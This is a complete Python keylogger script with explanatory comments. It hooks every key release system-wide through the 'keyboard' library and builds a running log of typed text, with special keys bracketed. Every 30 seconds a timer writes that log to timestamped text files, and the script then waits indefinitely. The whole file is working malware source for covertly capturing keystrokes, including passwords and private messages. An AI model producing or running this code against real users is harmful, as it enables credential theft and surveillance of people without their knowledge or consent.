import datetime
from threading import Timer
import keyboard

# a constant variable that sets the time interval (in seconds) for sending a report.
SEND_REPORT_EVERY = 30


# a class that encapsulates the functionality of the keylogger.
class Keylogger:
    # a constructor method that initializes the instance variables of the class.
    def __init__(self, interval, report_method="file"):
        self.report_method = report_method
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()

    # a method that gets called every time a keyboard event occurs,
    # and appends the corresponding key value to a log string.
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    # a method that updates the filename for the log file based
    # on the start and end timestamps of the logging session.
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "_").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    # a method that writes the log string to a file with the updated filename.
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)

    # a method that sends a report of the logged keystrokes after
    # a fixed time interval, and resets the log string.
    def report(self):
        if self.log:
            self.end_dt = datetime.datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    # a method that starts the keylogging session, sets up the event listener and the periodic reporting task,
    # and waits for keyboard events to occur.
    def start(self):
        self.start_dt = datetime.datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


# a statement that checks if the script is being run as the main program, and creates a new instance of the Keylogger
# class with the desired time interval and report method, and starts the keylogging session.
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
